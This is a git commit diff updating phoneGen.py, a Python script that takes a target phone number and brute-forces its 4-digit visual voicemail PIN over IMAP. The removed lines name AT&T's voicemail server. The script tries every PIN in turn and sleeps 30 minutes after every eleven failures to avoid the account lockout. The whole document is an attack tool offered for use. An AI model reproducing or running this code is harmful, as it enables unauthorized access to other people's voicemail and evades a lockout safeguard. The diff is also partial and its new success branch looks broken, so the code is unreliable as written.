cd703bc082b9ec4e2af69604003fa8ec91299512
joldboy69 <52323012+joldboy69@users.noreply.github.com>
2021-09-14 21:39:29 -0400

    Update phoneGen.py
    Version 0.3

--- phoneGen.py
+++ phoneGen.py
@@ -2,16 +2,8 @@ import imaplib
 import sys
 import time
 
-tarNum = sys.argv[1]
-
-"""carrier = sys.argv[2]
-
-carrierServer = {"att":"vvm.mobile.att.net","tmobile":"??","verizon":"???"} #not utilized yet as i dont have the imap server for tmobile and verizon
-carrierSleep = {"att":1204,"tmobile":0,"verizon":0}
-
-carr = carrierServer[carrier]
-
-"""
+num = sys.argv[1]
+index =0
 
 def crack(number,x):
     try:
@@ -20,23 +12,25 @@ def crack(number,x):
         imap1.close()
         return x
     except Exception as err:
-        if "blocked" in str(err) or "locked" in str(err):
+        if "invalid phone number or password" in str(err):
             return 2
         else:
             return 3
 
-for p in range(9999):
-    passw = str(p).zfill(4)
-    att = crack(tarNum,passw)
-    if att != 2 and (att != 3):
-        print("[+] "+str(passw))
+for c in range(9999):
+    passw = str(c).zfill(4)
+    g = crack(num,passw)
+    if g== 3:
+        print("[!] Ran into an error! Quitting...")
         break
-    elif att == 2:
-        print("[!] Mailbox locked. Sleeping for 30 minutes...")
-        time.sleep(1804) #30 minutes seems to work for at&t
-    elif att == 3:
-        print("[-] "+str(passw))
+    elif g == 2:
+        print("[-] "+str(g))
+        index += 1
+        if index >= 11:
+            print("[*] Sleeping 30 minutes to avoid lock...")
+            index =0
+            time.sleep(1802)
     else:
-        print("[!] Unknown error. Maybe check your internet connection? Exiting...")
-        break
+        print("[+] "+str(g))
 
+        
